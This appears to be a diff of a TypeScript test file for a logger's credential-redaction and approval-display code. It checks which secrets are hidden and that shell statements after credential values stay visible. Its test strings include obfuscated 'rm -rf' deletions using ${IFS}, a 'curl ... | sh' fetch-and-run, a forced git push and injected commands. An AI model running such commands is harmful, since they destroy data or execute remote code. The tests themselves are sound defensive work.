@@ -1,7 +1,8 @@
 import { randomBytes } from 'node:crypto'
 import { setTimeout as delay } from 'node:timers/promises'
 import { describe, expect, it } from 'vitest'
-import { createLogger, createOperationScope, isCredentialKey, isCredentialParameter, redactCredentials, redactText, redactUrlParameters, runInScope, type LogEvent, type LoggerConfig, type LogSink } from '../../src/index.js'
+import { createLogger, createOperationScope, isCredentialKey, isCredentialParameter, redactCredentials, redactText, redactUrl, runInScope, type CredentialContext, type LogEvent, type LoggerConfig, type LogSink } from '../../src/index.js'
+import { isCredentialQueryName, isNamedCredentialKey } from '../../src/logger/credential-names.js'
 
 function memorySink(): LogSink & { events: LogEvent[] } {
   const events: LogEvent[] = []
@@ -211,7 +212,7 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
     expect(redactText('open https://bare-userinfo-word@host.example?x=1')).toBe('open https://[redacted]@host.example?x=1')
     expect(redactText('clone https://user:p@ss@word@host.example/org/repo.git')).toBe('clone https://[redacted]@host.example/org/repo.git')
     expect(redactText('mail me@example.com about https://host.example/a@b')).toBe('mail me@example.com about https://host.example/a@b')
-    expect(redactUrlParameters('https://api.example.com/x?access_token=abc&key=def&sig=ghi&page=2#code=jkl')).toBe('https://api.example.com/x?access_token=[redacted]&key=[redacted]&sig=[redacted]&page=2#code=[redacted]')
+    expect(redactText('GET https://api.example.com/x?access_token=abc&key=def&sig=ghi&page=2#code=jkl')).toBe('GET https://api.example.com/x?access_token=[redacted]&key=[redacted]&sig=[redacted]&page=2#code=[redacted]')
     expect(isCredentialParameter('client_secret', 'x')).toBe(true)
     expect(isCredentialParameter('page', '2')).toBe(false)
   })
@@ -219,7 +220,7 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
   // Slice 7b review R7B-CR-8: `pwd` named no credential, so a password passed as `?pwd=` showed in every context.
   it('redacts a pwd query parameter in a log line and in a URL', () => {
     expect(redactText('GET https://h.example/?pwd=p5ecret failed')).toBe('GET https://h.example/?pwd=[redacted] failed')
-    expect(redactUrlParameters('https://h.example/?pwd=p5ecret&page=2')).toBe('https://h.example/?pwd=[redacted]&page=2')
+    expect(redactUrl('https://h.example/?pwd=p5ecret&page=2')).toBe('https://h.example/?pwd=[redacted]&page=2')
     expect(isCredentialParameter('pwd', 'p5ecret')).toBe(true)
   })
 
@@ -246,29 +247,6 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
     expect(event.fields).toEqual({ note: shown })
     const plain = 'payee,amount,account\nhttps://pay.example.com/?page=1,1000000,x@y.com\n'
     expect(redactText(plain)).toBe(plain)
-  })
-
-  // Slice 7c review R7C-TL-1 (default D31): a word's credential value ran to `&` or `#` whatever the word held, so the
-  // statements after `?token=x` in an eval string, a `$(` body or an ssh command were hidden. Only a URL that is its
-  // whole unit keeps that rule; any other word's value ends as a shell word ends it.
-  it.each<[string, 'word' | 'shell', string]>([
-    ['an eval string', 'shell', 'eval "curl https://h.invalid/?token=x;rm${IFS}-rf${IFS}~/nothing-here"'],
-    ['a pipe in an eval string', 'shell', 'eval "curl -s https://h/?token=x|sh"'],
-    ['a $( body in double quotes', 'shell', 'echo "$(curl https://h/?token=x;rm -rf build)"'],
-    ['an ssh remote command word', 'word', 'curl https://h/?token=x;rm -rf build'],
-    ['a word with ${IFS} before the URL', 'word', '"$(curl${IFS}https://h/?token=x;rm${IFS}-rf${IFS}build)"'],
-    ['a $( in a double-quoted URL', 'word', 'curl "https://h/?token=x$(rm -rf ~)"'],
-  ])('shows what follows a credential value in %s', (_, context, text) => {
-    expect(redactCredentials(text, context)).toBe(text.replace('?token=x', '?token=[redacted]'))
-  })
-
-  it.each<[string, 'word' | 'shell', string, string]>([
-    ['a URL field', 'word', 'https://h.example/x?token=ab(c5ecret)d', 'https://h.example/x?token=[redacted]'],
-    ['a URL after an option name', 'word', '--url=https://h.example/x?token=ab|c5ecret&page=2', '--url=https://h.example/x?token=[redacted]&page=2'],
-    ['a single-quoted URL in a shell body', 'shell', "curl 'https://h/?token=a b'", "curl 'https://h/?token=[redacted]'"],
-    ['a double-quoted URL in a shell body', 'shell', 'curl "https://h/?token=ab(c5ecret)d"', 'curl "https://h/?token=[redacted]"'],
-  ])('still hides the whole credential value of %s', (_, context, text, shown) => {
-    expect(redactCredentials(text, context)).toBe(shown)
   })
 
   it.each([
@@ -377,6 +355,83 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
     const frame = 'at runRequestInScope (file:///home/user/projects/buckle/packages/runtime/src/nitro/guards.ts:125:29)'
     const event = await logOnce({ relative, frame, dir: '/home/user/.5straps/buckle/workspaces/2f9c1d/history' })
     expect(event.fields).toEqual({ relative, frame, dir: '/home/user/.5straps/buckle/workspaces/2f9c1d/history' })
+  })
+})
+
+// Owner ruling B (2026-10-03, "hide whole-URL and named-key values only"): an approval display hides a credential only in
+// a value that is one whole URL or under a key named password, secret or token; shell scripts, script bodies and free
+// text show raw. The log above keeps its own matcher (log-credentials.ts): a log line is not an action anyone approves.
+describe('what an approval display hides (owner ruling B)', () => {
+  // The held slice 7b, 7c and 7d review Highs: each shape hid the statements after a credential value on every route.
+  it.each<[string, string]>([
+    ['R7B-CR-1 an eval string', 'git push --force origin main; eval "true https://a;{rm,-rf,build};{echo,me@x}"'],
+    ['R7B-CR-1 a $( body', 'echo "$(true https://a;rm${IFS}-rf${IFS}build;echo${IFS}me@x)"'],
+    ['R7B-CR-1 a backtick body', 'echo `true https://a;rm${IFS}-rf${IFS}build;echo${IFS}me@x`'],
+    ['R7B-CR-2 a python script', "import os\nos.system('https://a.example; rm -rf build; echo me@x')"],
+    ['R7B-CR-3 an escaped curl body', String.raw`curl -d "{\"to\":\"https://pay.example.com\",\"amount\":\"1000000\",\"acct\":\"x@y.com\"}" https://api/`],
+    ['R7B-CR-4 an su -c script', 'true https://a;cd;rm${IFS}-rf${IFS}*;echo${IFS}me@x'],
+    ['R7C-TL-1 an eval string', 'eval "curl https://h.invalid/?token=x;rm${IFS}-rf${IFS}~/nothing-here"'],
+    ['R7D-WV-1 a quote inside double quotes', `echo "fetching 'https://h/?token=x$(rm -rf build)'"`],
+    ['R7D-WV-2 an eval string', 'eval "https://h/?token=x;rm -rf build"'],
+    ['R7D-WV-2 an escaped statement', String.raw`eval curl https://h/?token=x\;rm\${IFS}-rf\${IFS}build`],
+    ['R7D-WV-2 a URL-first word', 'https://h/?token=x;rm${IFS}-rf${IFS}build'],
+    ['a heredoc', "cat > run.sh <<'EOF'\nDB_PASSWORD=p5ecret curl https://u:p5ecret@h.example/x\nEOF\nsh run.sh"],
+    ['free text', 'connect to https://u:p5ecret@h.example/x?token=t5ecret failed'],
+  ])('shows %s whole as a value, as text and as JSON', (_, text) => {
+    for (const context of ['value', 'text', 'json'] as const) expect(redactCredentials(text, context), context).toBe(text)
+  })
+
+  it.each<[string, CredentialContext, string, string]>([
+    ['a URL field', 'value', 'https://u:p5ecret@h.example/x?token=t5ecret&page=2#top', 'https://u:[redacted]@h.example/x?token=[redacted]&page=2#top'],
+    ['a URL after an option name', 'value', '--url=https://u:p5ecret@h.example/x?api_key=k5ecret&page=2', '--url=https://u:[redacted]@h.example/x?api_key=[redacted]&page=2'],
+    ['a quoted URL as the whole value', 'value', "'https://u:p5ecret@h.example/x?sig=s5ecret'", "'https://u:[redacted]@h.example/x?sig=[redacted]'"],
+    ['a URL whose password holds an @', 'value', 'https://user:p@5ecret@host.example/x', 'https://user:[redacted]@host.example/x'],
+    ['a named argument', 'value', '--db-password=p5ecret', '--db-password=[redacted]'],
+    ['an assignment word', 'value', 'API_TOKEN=t5ecret', 'API_TOKEN=[redacted]'],
+    ['env lines', 'text', "HOST=db\nexport DB_PASSWORD='p5ecret' # prod\nclientSecret=c5ecret\n", 'HOST=db\nexport DB_PASSWORD=[redacted] # prod\nclientSecret=[redacted]\n'],
+    ['an env line holding a URL', 'text', 'DATABASE_URL=postgres://app:p5ecret@db.internal:5432/app', 'DATABASE_URL=postgres://app:[redacted]@db.internal:5432/app'],
+    ['a JSON document', 'json', '{"token":"t5ecret","nested":[{"db_password":{"v":1}}],"url":"https://u:p5ecret@h.example/","max_tokens":1000}', '{"token":"[redacted]","nested":[{"db_password":"[redacted]"}],"url":"https://u:[redacted]@h.example/","max_tokens":1000}'],
+    ['a whole URL with a CSV row in its token', 'value', 'https://pay.example.com/?token=t5ecret,1000000,x@y.com', 'https://pay.example.com/?token=[redacted]'],
+  ])('hides %s', (_, context, text, shown) => {
+    expect(redactCredentials(text, context)).toBe(shown)
+  })
+
+  it.each<[string, CredentialContext, string]>([
+    ['a CSV line', 'text', 'https://pay.example.com/?token=t5ecret,1000000,x@y.com'],
+    ['a named value with a statement after it', 'value', 'DB_PASSWORD=p5ecret; rm -rf build'],
+    ['a named value with a substitution', 'text', 'API_TOKEN=$(curl -s https://h.example/t)'],
+    ['a URL password holding a shell character', 'value', 'postgres://app:pa$$w0rd5ecret@db.internal/app'],
+    ['a URL inside a longer word', 'value', 'mirror,https://u:p5ecret@h.example/x'],
+    ['a user name with no password', 'value', 'https://bot@github.com/org/repo.git'],
+    ['a fragment parameter', 'value', 'https://h.example/cb#access_token=t5ecret'],
+    ['a key that names none of the three words', 'json', '{"api_key":"k5ecret","Authorization":"Bearer b5ecret"}'],
+    ['a YAML key', 'text', 'password: p5ecret'],
+  ])('shows %s raw', (_, context, text) => {
+    expect(redactCredentials(text, context)).toBe(text)
+  })
+
+  it('names password, secret and token keys whatever surrounds them, and keeps counts', () => {
+    for (const name of ['password', 'DB_PASSWORD', 'PGPASSWORD', 'passwd', 'pass_word', 'api_token', 'GITHUB_TOKEN', 'clientSecret', 'client-secret']) expect({ name, named: isNamedCredentialKey(name, 'x') }).toEqual({ name, named: true })
+    for (const name of ['path', 'api_key', 'Authorization', 'PWD', 'cookie']) expect({ name, named: isNamedCredentialKey(name, 'x') }).toEqual({ name, named: false })
+    expect(isNamedCredentialKey('max_tokens', 1000)).toBe(false)
+    expect(isNamedCredentialKey('max_tokens', 'sk-live-abc')).toBe(true)
+    for (const name of ['access_token', 'X-Amz-Signature', 'sig', 'key', 'apiKey', 'auth', 'pwd']) expect({ name, query: isCredentialQueryName(name, 'x') }).toEqual({ name, query: true })
+    for (const name of ['page', 'code', 'keyword', 'author']) expect({ name, query: isCredentialQueryName(name, 'x') }).toEqual({ name, query: false })
+    expect(redactUrl('https://h.example/?max_tokens=4096&code=c5ecret&pwd=p5ecret')).toBe('https://h.example/?max_tokens=4096&code=c5ecret&pwd=[redacted]')
+  })
+
+  it.each<[string, string]>([
+    ['many query parameters', `https://h.example/?${'a=1&'.repeat(250_000)}token=t5ecret`],
+    ['many lines', 'DB_PASSWORD=p5ecret\n'.repeat(50_000)],
+    ['a long name with no =', `A${'b'.repeat(1_048_000)}`],
+    ['deep JSON', `${'['.repeat(500_000)}${']'.repeat(500_000)}`],
+    ['a long named JSON value', `{"token":[${'1,'.repeat(500_000)}1]}`],
+  ])('reads a 1 MiB value of %s in one pass', (_, text) => {
+    for (const context of ['value', 'text', 'json'] as const) {
+      const started = performance.now()
+      redactCredentials(text, context)
+      expect(performance.now() - started, context).toBeLessThan(1_000)
+    }
   })
 })
 
